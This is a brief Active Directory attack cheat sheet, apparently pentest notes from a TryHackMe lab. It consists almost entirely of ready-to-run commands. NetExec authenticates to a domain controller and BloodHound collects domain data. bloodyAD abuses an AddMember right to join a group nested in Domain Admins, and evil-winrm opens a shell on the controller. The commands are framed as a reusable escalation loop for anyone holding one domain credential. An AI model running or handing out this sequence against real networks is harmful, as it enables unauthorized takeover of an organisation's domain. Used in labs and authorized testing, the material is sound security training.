# Active Directory

Collection → graph analysis → ACL abuse, the standard AD escalation loop once you have one domain credential.

```bash
nxc smb <DC_IP> -u <USER> -p '<PASS>'
nxc smb <DC_IP> -u <USER> -p '<PASS>' --generate-hosts-file hosts
# /etc/hosts: <DC_IP>  <DC_FQDN> <domain> <DC_SHORTNAME>

bloodhound-ce.py -u '<USER>' -p '<PASS>' -d <domain> -dc <DC_FQDN> -ns <DC_IP> -c All --zip

# if BloodHound shows you have AddMember on a privileged-nested group:
bloodyAD --host <DC_FQDN> -d <domain> -u <USER> -p '<PASS>' add groupMember '<GROUP>' <USER>

nxc smb <DC_IP> -u <USER> -p '<PASS>'        # re-check — should now show Pwn3d / admin
evil-winrm -i <DC_FQDN> -u <USER> -p '<PASS>'
```

— TryHackMe / Dead Drop (`AddMember` on a group nested in Domain Admins)
